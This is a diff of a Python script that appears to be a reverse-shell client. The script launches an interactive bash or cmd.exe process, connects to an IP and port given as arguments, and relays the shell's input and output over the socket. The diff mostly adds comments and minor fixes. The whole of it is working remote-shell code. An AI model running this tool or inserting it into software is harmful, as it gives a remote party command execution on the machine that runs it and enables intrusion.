@@ -10,26 +10,31 @@ if sys.version_info.major < 3:
     print("need python3 to run")
     exit(0)
 
-signal.signal(signal.SIGINT, signal.SIG_DFL)
-
 if len(sys.argv) != 3:
     print("invalid argument", sys.argv)
     exit(0)
+
+# allow quit this program by signal
+signal.signal(signal.SIGINT, signal.SIG_DFL)
 
 print("OS is", platform.system())
 ip = sys.argv[1]
 port = int(sys.argv[2])
 print("IP=", ip, ", ", "port=", port)
 
+# decide the shell command based on OS
 cmd_arr = ["bash", "-i"]
 if platform.system() == "Windows":
     cmd_arr = ["cmd.exe"]
 
+# open a subprocess of shell command, capture the stdin and stdout
+# and with stderr redirected to stdout
 p = sp.Popen(cmd_arr, stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)
 
+# connect to the "server"
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# make connect() timeout in 5 seconds
 s.settimeout(5)
-
 try:
     s.connect((ip, port))
 except:
@@ -37,6 +42,10 @@ except:
     exit(0)
 
 print("connected")
+
+# after connected, change timeout back, for better compatiblity
+# note: for python3 < 3.7, a positive timeout will set the underlying socket to non-blocking,
+# which can break the behavior of something like p.stdout.fileno()
 s.settimeout(None)
 s.send("hello message from client!!!!\n".encode())
 
@@ -47,6 +56,7 @@ def stdout_thread():
         s.send(o)
 
 
+# use a thread to copy stdout to socket
 threading.Thread(target=stdout_thread, daemon=True).start()
 
 last_active_time = time.time()
@@ -56,14 +66,18 @@ def stdin_thread():
     global last_active_time
     while True:
         i = s.recv(1024)
+        # a zero recv of TCP indicates EOF
         if len(i) == 0:
+            print("quit by EOF")
             exit(0)
         last_active_time = time.time()
         os.write(p.stdin.fileno(), i)
 
 
+# use another thread to copy from socket to stdin
 threading.Thread(target=stdin_thread, daemon=True).start()
 
+# hanlde timeout by last active time
 while True:
     print("current_time:", time.time(), ",  last active time:", last_active_time)
     sys.stdout.flush()
